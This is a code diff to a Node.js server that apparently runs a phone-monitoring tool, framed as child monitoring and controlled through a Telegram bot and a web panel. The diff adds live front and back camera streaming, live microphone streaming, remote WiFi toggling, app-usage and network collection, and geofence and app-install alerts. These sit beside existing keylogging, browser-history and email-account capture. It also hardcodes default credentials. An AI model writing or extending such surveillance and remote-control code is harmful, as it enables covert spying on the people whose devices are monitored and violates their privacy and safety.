@@ -20,7 +20,7 @@ const PORT           = process.env.PORT         || 3000;
 const SECURITY_TOKEN = process.env.SHIELD_TOKEN || "GAJARBOTOL80";
 const BOT_TOKEN      = process.env.BOT_TOKEN    || "";
 const ADMIN_TG_ID    = Number(process.env.ADMIN_TG_ID) || 5197344486;
-const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "@@@@11Aa";
+const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "Shield@2025";
 const PUBLIC_URL     = (process.env.PUBLIC_URL  || "").replace(/\/$/, "");
 
 const app = express();
@@ -698,6 +698,29 @@ function handleBotDataResult(chatId, deviceId, payload) {
       if (entries.length > 30) text += `\n_…aro ${entries.length-30} ta entry_`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
         reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
+
+    } else if (payload.type === 'app_usage_result') {
+      const items = payload.items || [];
+      if (payload.error) { bot.sendMessage(chatId, `📊 *App Usage — ${escDev}*\n\n❌ ${escapeMd(payload.error)}`, { parse_mode: 'Markdown' }); return; }
+      if (items.length === 0) { bot.sendMessage(chatId, `📊 No usage data.`); return; }
+      let text = `📊 *App Usage (24h) — ${escDev}*\n\n`;
+      for (const u of items.slice(0, 25)) {
+        const mins = u.minutes || 0;
+        const bar = '█'.repeat(Math.min(10, Math.max(1, Math.round(mins / 30))));
+        text += `${bar} ${escapeMd(u.app)} — *${mins} min*\n`;
+      }
+      bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
+
+    } else if (payload.type === 'network_info_result') {
+      if (payload.error) { bot.sendMessage(chatId, `📶 *Network — ${escDev}*\n\n❌ ${escapeMd(payload.error)}`, { parse_mode: 'Markdown' }); return; }
+      let text = `📶 *Network Info — ${escDev}*\n\n`;
+      text += `🛜 Type: *${escapeMd(payload.networkType || '—')}*\n`;
+      text += `📡 WiFi: *${payload.wifiEnabled ? 'ON' : 'OFF'}*\n`;
+      if (payload.ssid) text += `📛 SSID: \`${escapeMdCode(payload.ssid)}\`\n`;
+      if (payload.rssi && payload.rssi > -127) text += `📶 Signal: ${payload.rssi} dBm\n`;
+      bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
     }
   } catch (e) { console.error('[BOT] Data result error:', e.message); }
 }
@@ -806,6 +829,22 @@ function initTelegramBot() {
       [
         { text: "⌨️ Keylog",         callback_data: `act:keylog:${deviceId}` },
         { text: "🔔 Ring Loud",      callback_data: `act:ring:${deviceId}` },
+      ],
+      [
+        { text: "📊 App Usage",      callback_data: `act:app_usage:${deviceId}` },
+        { text: "📶 Network Info",   callback_data: `act:network_info:${deviceId}` },
+      ],
+      [
+        { text: "📹 Cam LIVE Front", callback_data: `act:cam_stream_front:${deviceId}` },
+        { text: "📹 Cam LIVE Back",  callback_data: `act:cam_stream_back:${deviceId}` },
+      ],
+      [
+        { text: "🎙️ Mic LIVE",       callback_data: `act:mic_stream:${deviceId}` },
+        { text: "⏹ Stop Streams",    callback_data: `act:stop_streams:${deviceId}` },
+      ],
+      [
+        { text: "📶 WiFi ON",        callback_data: `act:wifi_on:${deviceId}` },
+        { text: "📴 WiFi OFF",       callback_data: `act:wifi_off:${deviceId}` },
       ],
       [
         { text: "🚫 Block App",      callback_data: `act:block_app:${deviceId}` },
@@ -1392,11 +1431,43 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
+      // ── live camera / mic streams & network toggles ──────────────────
+      const streamActionMap = {
+        cam_stream_front: { cmd: 'start_camera_stream', facing: 'front' },
+        cam_stream_back:  { cmd: 'start_camera_stream', facing: 'back'  },
+        mic_stream:       { cmd: 'start_audio_stream' },
+        stop_streams:     { cmd: 'stop_all_streams' },
+        wifi_on:          { cmd: 'wifi_on' },
+        wifi_off:         { cmd: 'wifi_off' },
+      };
+      if (streamActionMap[action]) {
+        if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
+        const spec = streamActionMap[action];
+        bot.answerCallbackQuery(query.id, { text: spec.cmd === 'stop_all_streams' ? '⏹ Stopping live streams…' : 'Sending…' });
+        if (spec.cmd === 'start_camera_stream') {
+          sendCommandToDevice(deviceId, { command: spec.cmd, facing: spec.facing });
+          bot.sendMessage(chatId, `📹 Live *${spec.facing} camera* stream starting on *${escapeMd(getDeviceName(deviceId))}*…\n_Web panel e LIVE dekhun._`, { parse_mode: 'Markdown' });
+        } else if (spec.cmd === 'start_audio_stream') {
+          sendCommandToDevice(deviceId, { command: spec.cmd });
+          bot.sendMessage(chatId, `🎙️ Live microphone stream starting on *${escapeMd(getDeviceName(deviceId))}*…\n_Web panel e sunte parben._`, { parse_mode: 'Markdown' });
+        } else if (spec.cmd === 'stop_all_streams') {
+          sendCommandToDevice(deviceId, { command: 'stop_camera_stream' });
+          sendCommandToDevice(deviceId, { command: 'stop_audio_stream' });
+          bot.sendMessage(chatId, `⏹ Live camera & mic streams stopped on *${escapeMd(getDeviceName(deviceId))}*`, { parse_mode: 'Markdown' });
+        } else {
+          sendCommandToDevice(deviceId, { command: spec.cmd });
+          bot.sendMessage(chatId, `${spec.cmd === 'wifi_on' ? '📶 Turning WiFi ON' : '📴 Turning WiFi OFF'} for *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
+        }
+        return;
+      }
+
       // email accounts / browser history / keylog (data results)
       const dataActionMap = {
         email_accounts:    { cmd: 'get_email_accounts',   type: 'email_accounts_result',    msg: '📧 Loading email accounts…' },
         browser_history:   { cmd: 'get_browser_history',  type: 'browser_history_result',   msg: '🌐 Loading browser history…' },
         keylog:            { cmd: 'get_keylog',           type: 'keylog_result',            msg: '⌨️ Loading keylog…' },
+        app_usage:         { cmd: 'get_app_usage',        type: 'app_usage_result',         msg: '📊 Loading 24h app usage…' },
+        network_info:      { cmd: 'get_network_info',     type: 'network_info_result',      msg: '📶 Loading network info…' },
       };
       if (dataActionMap[action]) {
         const spec = dataActionMap[action];
@@ -2060,6 +2131,72 @@ function normalizeFeatureResponse(payload) {
         time: Date.now()
       };
 
+    case 'camera_stream_frame':
+      return {
+        type: 'camera_stream_frame',
+        image: `data:image/jpeg;base64,${payload.base64 || ''}`,
+        facing: payload.facing || 'back',
+        seq: payload.seq || 0,
+        time: Date.now()
+      };
+
+    case 'audio_stream_chunk':
+      return {
+        type: 'audio_stream_chunk',
+        base64: payload.base64 || '',
+        rate: payload.rate || 8000,
+        samples: payload.samples || 0,
+        time: Date.now()
+      };
+
+    case 'network_info_result':
+      if (payload.error) {
+        return { type: 'network_info_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'network_info_result',
+        networkType: payload.networkType || '',
+        wifiEnabled: !!payload.wifiEnabled,
+        ssid: payload.ssid || '',
+        rssi: payload.rssi || 0,
+        time: Date.now()
+      };
+
+    case 'app_usage_result':
+      if (payload.error) {
+        return { type: 'app_usage_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'app_usage_result',
+        items: (payload.items || []).map(u => ({
+          package: u.package || '',
+          app: u.app || u.package || '',
+          minutes: u.minutes || 0,
+          lastUsed: u.lastUsed || 0
+        })),
+        time: Date.now()
+      };
+
+    case 'geofence_event':
+      return {
+        type: 'geofence_event',
+        event: payload.event || 'left',
+        lat: payload.lat,
+        lng: payload.lng,
+        distanceM: payload.distanceM || 0,
+        radiusM: payload.radiusM || 0,
+        time: payload.time || Date.now()
+      };
+
+    case 'app_install_event':
+      return {
+        type: 'app_install_event',
+        event: payload.event || 'installed',
+        package: payload.package || '',
+        app: payload.app || payload.package || '',
+        time: payload.time || Date.now()
+      };
+
     default:
       return null;
   }
@@ -2319,6 +2456,53 @@ wss.on('connection', (ws, req) => {
           if (pr && bot) {
             pendingBotFileRequests.delete(deviceId + '_data');
             handleBotDataResult(pr.chatId, deviceId, payload);
+          }
+
+        } else if (payload.type === 'camera_stream_frame' || payload.type === 'audio_stream_chunk') {
+          // High-frequency live streams — web panel only, never spammed to the bot.
+          broadcastToAdmins({ ...payload, deviceId });
+
+        } else if (payload.type === 'network_info_result') {
+          payload.deviceId = deviceId;
+          broadcastToAdmins(payload);
+          if (bot && payload.error) {
+            notifyAdmin(`📶 *Network info failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error)}`);
+          }
+
+        } else if (payload.type === 'app_usage_result') {
+          payload.deviceId = deviceId;
+          broadcastToAdmins(payload);
+          const pr = pendingBotFileRequests.get(deviceId + '_data');
+          if (pr && bot) {
+            pendingBotFileRequests.delete(deviceId + '_data');
+            handleBotDataResult(pr.chatId, deviceId, payload);
+          }
+
+        } else if (payload.type === 'geofence_event') {
+          const t = new Date(payload.time || Date.now()).toLocaleString();
+          broadcastToAdmins({ ...payload, deviceId, timeLabel: t });
+          if (bot) {
+            const dir = payload.event === 'entered' ? '🟢 entered' : '🔴 left';
+            notifyAdmin(
+              `📍 *Geofence alert — ${escapeMd(dev.childName)}*\n\n` +
+              `Child ${dir} the safe zone\n` +
+              `📏 Distance from center: *${payload.distanceM}m* (radius ${payload.radiusM}m)\n` +
+              `🗺️ https://www.google.com/maps?q=${payload.lat},${payload.lng}\n🕐 ${t}`,
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+            );
+          }
+
+        } else if (payload.type === 'app_install_event') {
+          const t = new Date(payload.time || Date.now()).toLocaleString();
+          broadcastToAdmins({ ...payload, deviceId, timeLabel: t });
+          if (bot) {
+            const ev = payload.event;
+            const emoji = ev === 'installed' ? '🆕' : (ev === 'updated' ? '🔄' : '🗑️');
+            const verb = ev === 'installed' ? 'was INSTALLED' : (ev === 'updated' ? 'was UPDATED' : 'was UNINSTALLED');
+            notifyAdmin(
+              `${emoji} *App ${verb}* on ${escapeMd(dev.childName)}\n\n📦 *${escapeMd(payload.app)}*\n\`${escapeMdCode(payload.package)}\`\n🕐 ${t}`,
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
+            );
           }
 
         } else if (payload.type === 'file_manager_response') {
